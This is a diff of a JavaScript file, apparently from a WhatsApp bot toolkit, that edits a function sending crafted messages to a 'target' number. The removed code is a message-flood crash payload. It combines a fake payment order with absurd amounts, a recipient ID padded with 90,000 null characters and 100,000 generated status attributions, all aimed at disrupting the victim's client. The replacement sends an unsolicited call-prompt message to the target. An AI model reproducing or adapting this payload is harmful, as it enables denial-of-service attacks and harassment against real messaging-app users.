@@ -4295,59 +4295,27 @@ async function shibal(sock, target) {
   await sock.relayMessage(
     target,
     {
-  groupStatusMessageV2: { 
-    message: {
-      interactiveResponseMessage: {
-        body: {
-          text: "6core",
-          format: "DEFAULT",
-        },
-        nativeFlowResponseMessage: {
-          name: "review_and_pay",
-          paramsJson: JSON.stringify({
-            reference_id: "ORDER-123",
-            currency: "IDR",
-            total_amount: {
-              value: 1500000000000,
-              offset: 100
+      groupStatusMessageV2: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "Call Target",
+              format: "DEFAULT"
             },
-            payment_settings: [{
-              type: "pix_dynamic_code"
-            }],
-            order: {
-              status: "pending",
-              items: [
-                {
-                  retailer_id: "SKU001",
-                  name: "Produk A",
-                  amount: {
-                    value: 1500009999999,
-                    offset: 10000
-                  },
-                  quantity: 900
-                }
-              ],
-              subtotal: {
-                value: 15000099999999,
-                offset: 10000
-              }
+
+            nativeFlowResponseMessage: {
+              name: "cta_call",
+              paramsJson: JSON.stringify({
+                display_text: "Call Now",
+                id: target.replace(/@.+/, "")
+              })
             }
-          })
-        },
-        contextInfo: {
-          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
-          isForwarded: true,
-          forwardingScore: 9999,
-          statusAttributionType: 3,
-            statusAttributions: Array.from({ length: 100000 }, (_, n) => ({
-              participant: `62${n + 836598}@s.whatsapp.net`,
-              type: 1
-            })),
-        },
-      },
+          }
+        }
+      }
     },
-  },
-}, { participant: { jid: target }});
+    {}
+  )
 }
 
 async function Vdelay(sock, target) {
